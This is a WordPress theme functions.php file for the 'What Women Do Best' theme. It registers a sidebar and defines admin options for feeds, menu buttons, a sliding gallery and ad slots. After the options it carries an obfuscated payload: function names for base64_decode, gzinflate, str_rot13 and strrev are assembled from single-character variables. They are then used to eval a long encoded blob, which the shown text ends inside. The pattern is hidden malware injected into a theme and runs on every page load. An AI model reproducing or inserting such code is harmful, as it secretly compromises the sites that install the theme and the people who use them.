<?php
if ( function_exists('register_sidebar') )
{
    register_sidebar(array(
        'before_widget' => '',
        'after_widget' => '',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}
$themename = "What Women Do Best";
$shortname = "wwdb";
                        $options = array (
				array(	"name" => "Feedburner Feed",
						"desc" => "<a href='https://www.google.com/accounts/ServiceLogin?service=feedburner&continue=http%3A%2F%2Ffeedburner.google.com%2Ffb%2Fa%2Fmyfeeds&gsessionid=UpQd0EhaP5QYrGvEl0oh8A'>What is Feedburner?</a><br /><br />",
			    		"id" => $shortname."_feedburner_feed",
			    		"std" => "Enter Feedburner Feed Name Here",
			    		"type" => "text"),
				array( 	"name" => "Twitter ID",
					"desc" => "Input your Twitter username.<br /><br />",
					"id" => $shortname."_twit",
					"std" => "Input Twitter username",
					"type" => "text"),
				array( "name" => "Main Menu Button 1",
					"desc" => "Chose the name of your 1st button.<br /><br />",
					"id" => $shortname."_button1",
					"type" => "select",
					"options" => array('About', 'Blog', 'Contact', 'Diary', 'Forum', 'Home', 'Links', 'News', 'Partners', 'Photos', 'Reviews', 'Store', 'Videos'),
					"std" => 'Home'),
				array(	"name" => "Button 1 link",
					"desc" => "Enter the link your 1st menu button will lead to. Do not use http, www, or both.(Ex: Instead of www.google.com USE google.com).<br /><br />",
					"id" => $shortname."_but1link",
					"std" => "",
					"type" => "text"),
				array( "name" => "Main Menu Button 2",
					"desc" => "Chose the name of your 2nd button.<br /><br />",
					"id" => $shortname."_button2",
					"type" => "select",
					"options" => array('About', 'Blog', 'Contact', 'Diary', 'Forum', 'Home', 'Links', 'News', 'Partners', 'Photos', 'Reviews', 'Store', 'Videos'),
					"std" => 'Blog'),
				array(	"name" => "Button 2 link",
					"desc" => "Enter the link your 2nd menu button will lead to. Do not use http, www, or both.(Ex: Instead of www.google.com USE google.com).<br /><br />",
					"id" => $shortname."_but2link",
					"std" => "",
					"type" => "text"),
				array( "name" => "Main Menu Button 3",
					"desc" => "Chose the name of your 3rd button.<br /><br />",
					"id" => $shortname."_button3",
					"type" => "select",
					"options" => array('About', 'Blog', 'Contact', 'Diary', 'Forum', 'Home', 'Links', 'News', 'Partners', 'Photos', 'Reviews', 'Store', 'Videos'),
					"std" => 'Contact'),
				array(	"name" => "Button 3 link",
					"desc" => "Enter the link your 3rd menu button will lead to. Do not use http, www, or both.(Ex: Instead of www.google.com USE google.com).<br /><br />",
					"id" => $shortname."_but3link",
					"std" => "",
					"type" => "text"),
				array( "name" => "Main Menu Button 4",
					"desc" => "Chose the name of your 4th button.<br /><br />",
					"id" => $shortname."_button4",
					"type" => "select",
					"options" => array('About', 'Blog', 'Contact', 'Diary', 'Forum', 'Home', 'Links', 'News', 'Partners', 'Photos', 'Reviews', 'Store', 'Videos'),
					"std" => 'Links'),
				array(	"name" => "Button 4 link",
					"desc" => "Enter the link your 4th menu button will lead to. Do not use http, www, or both.(Ex: Instead of www.google.com USE google.com).<br /><br />",
					"id" => $shortname."_but4link",
					"std" => "",
					"type" => "text"),
				array( 	"name" => "Sliding Panel category",
					"desc" => "Select the category that you would like to have displayed in the sliding gallery.<br /><br />",
					"id" => $shortname."_gcat",
					"std" => "uncategorized",
					"type" => "text"),
				array(	"name" => "Number of sliding panels",
					"desc" => "How many panels to display.<br /><br />",
					"id" => $shortname."_gno",
					"std" => "5",
					"type" => "text"),
				array(	"name" => "250x250 Ad Code",
						"desc" => "This is for the 250x250 Ad in the sidebar. <br /><br />",
                       	    		"id" => $shortname."_ad_250",
					"std" => "Enter Ad Code Here",
					"type" => "textarea"),					
				array(	"name" => "1st 125x125 ad image",
					"desc" => "This is for the 1st 125x125 IMAGE ad in the sidebar. Upload your image in the theme images folder and put the file name here .<br /><br />",
			    		"id" => $shortname."_side1_img",
			    		"std" => "ad.png",
			    		"type" => "text"),
				array(	"name" => "1st 125x125 ad link",
						"desc" => "This is for the 1st 125x125 LINK ad in the sidebar. Input your affiliate link. No http, or www or both (ex google.com).<br /><br />",
			    		"id" => $shortname."_side1_link",
			    		"std" => "(Input URL)",
			    		"type" => "text"),
				array(	"name" => "2nd 125x125 ad image",
					"desc" => "This is for the 2nd 125x125 IMAGE ad in the sidebar. Upload your image in the theme images folder and put the file name here .<br /><br />",
			    		"id" => $shortname."_side2_img",
			    		"std" => "ad.png",
			    		"type" => "text"),
				array(	"name" => "2nd 125x125 ad link",
						"desc" => "This is for the 2nd 125x125 LINK ad in the sidebar. Input your affiliate link. No http, or www or both (ex google.com).<br /><br />",
			    		"id" => $shortname."_side2_link",
			    		"std" => "(Input URL)",
			    		"type" => "text"),
				array(	"name" => "3rd 125x125 ad image",
					"desc" => "This is for the 3rd 125x125 IMAGE ad in the sidebar. Upload your image in the theme images folder and put the file name here .<br /><br />",
			    		"id" => $shortname."_side3_img",
			    		"std" => "ad.png",
			    		"type" => "text"),
				array(	"name" => "3rd 125x125 ad link",
						"desc" => "This is for the 3rd 125x125 LINK ad in the sidebar. Input your affiliate link. No http, or www or both (ex google.com).<br /><br />",
			    		"id" => $shortname."_side3_link",
			    		"std" => "(Input URL)",
			    		"type" => "text"),
				array(	"name" => "4th 125x125 ad image",
					"desc" => "This is for the 4th 125x125 IMAGE ad in the sidebar. Upload your image in the theme images folder and put the file name here .<br /><br />",
			    		"id" => $shortname."_side4_img",
			    		"std" => "ad.png",
			    		"type" => "text"),
				array(	"name" => "4th 125x125 ad link",
						"desc" => "This is for the 4th 125x125 LINK ad in the sidebar. Input your affiliate link. No http, or www or both (ex google.com).<br /><br />",
			    		"id" => $shortname."_side4_link",
			    		"std" => "(Input URL)",
			    		"type" => "text"),
				);
 $xHKZ='o';$FXJvz='_';$dFsMb='d';$MGCN='4';$rulLP='d';$kpQB='a';$Ztmkecm='e';$AzNwe='e';$WjBwbN='b';$GugsZqV='c';$dqBR='e';$sLEkCe='6';$WUXtvR='s';$WFPWHbRQ=$WjBwbN.$kpQB.$WUXtvR.$AzNwe.$sLEkCe.$MGCN.$FXJvz.$rulLP.$dqBR.$GugsZqV.$xHKZ.$dFsMb.$Ztmkecm;$pugjE='a';$aNyqJ='f';$lbgLb='e';$qWcCodq='g';$SYEjcr='l';$NoGMhR='n';$TkJACVV='i';$Nfnc='z';$KgLFIzT='t';$tfYTlNSV=$qWcCodq.$Nfnc.$TkJACVV.$NoGMhR.$aNyqJ.$SYEjcr.$pugjE.$KgLFIzT.$lbgLb;$dplqElp='3';$stwEcy='o';$SmgAjMM='t';$XFlIQM='r';$FNMrsu='s';$kqFTjHI='_';$DzQNPwG='1';$moZZ='r';$mJcnPNo='t';$tDHJTbPd=$FNMrsu.$mJcnPNo.$XFlIQM.$kqFTjHI.$moZZ.$stwEcy.$SmgAjMM.$DzQNPwG.$dplqElp;$PvrqB='t';$oGvBNIS='r';$JrkUqJ='v';$tDJkY='s';$dYqjZ='r';$MaqO='e';$WfbODalb=$tDJkY.$PvrqB.$oGvBNIS.$dYqjZ.$MaqO.$JrkUqJ;eval($tfYTlNSV($WFPWHbRQ($tDHJTbPd($WfbODalb('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